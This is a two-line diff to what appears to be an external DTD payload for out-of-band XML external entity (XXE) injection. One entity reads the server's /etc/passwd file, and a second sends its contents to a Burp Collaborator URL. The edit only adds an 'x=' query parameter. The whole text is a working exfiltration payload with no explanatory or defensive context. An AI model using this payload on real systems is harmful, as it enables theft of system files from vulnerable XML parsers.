@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://pwph47d1pqk3181rt7ygh3y6oxusih.burpcollaborator.net/?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://pwph47d1pqk3181rt7ygh3y6oxusih.burpcollaborator.net/?x=%data;'>">
